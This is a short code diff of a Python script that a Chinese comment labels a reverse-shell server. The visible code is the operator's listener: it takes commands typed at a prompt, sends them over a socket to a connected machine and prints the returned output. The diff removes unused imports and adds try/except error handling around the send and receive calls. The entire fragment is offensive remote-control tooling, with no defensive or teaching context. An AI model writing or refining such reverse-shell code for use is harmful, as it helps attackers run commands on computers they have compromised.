@@ -1,7 +1,5 @@
 import socket
 import time
-import pymysql
-import threading
 
 #反弹shell服务端
 
@@ -13,9 +11,14 @@ def thread_send():
             try:
                 user_input = input('>>> ').strip()
                 if user_input!="": #输入不为空
-                    conn.send(user_input.encode('utf-8')) #编码发送
-                    
-                    cmd=conn.recv(4096).decode() #解码接受
+                    try:
+                        conn.send(user_input.encode('utf-8')) #编码发送
+                    except:
+                        print("服务器发送异常")
+                    try:
+                        cmd=conn.recv(4096).decode() #解码接受
+                    except:
+                        print("服务器接收异常")
                     print(cmd) #输出命令
        
                 elif user_input=="":
